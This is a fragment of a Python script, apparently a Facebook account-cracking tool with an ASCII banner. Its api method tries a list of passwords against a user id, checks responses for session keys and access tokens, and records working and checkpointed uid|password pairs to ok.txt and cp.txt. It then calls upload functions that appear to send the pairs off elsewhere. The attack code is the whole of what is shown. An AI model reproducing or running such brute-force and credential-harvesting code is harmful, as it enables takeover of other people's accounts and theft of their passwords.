...
\033[0;1m|  __  | | | | |\/| |  __| | |     |__ < / /               | |  | |_| |_| |  | | |____| |____ ___) / /_
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[HAMII-OKðŸ˜] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [HAMII-OKðŸ˜] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[HAMII-CPðŸ˜­] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [HAMII-CPðŸ˜­] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
